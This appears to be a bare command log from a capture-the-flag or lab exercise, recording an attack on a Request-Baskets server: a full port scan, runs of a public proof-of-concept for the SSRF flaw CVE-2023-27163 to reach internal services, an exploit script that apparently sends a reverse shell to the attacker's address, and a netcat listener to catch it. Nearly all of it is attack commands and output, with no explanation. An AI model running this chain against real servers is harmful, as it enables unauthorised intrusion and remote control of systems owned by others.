sudo nmap -n -Pn -p-

./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80  
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

./script.sh http://10.129.127.134:55555 http://127.0.0.1:80/login  
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

python3 exploit.py 10.10.16.44 1234 http://10.129.127.134:55555/sbqmby  
Running exploit on http://10.129.127.134:55555/sbqmby

nc -nlvp 7733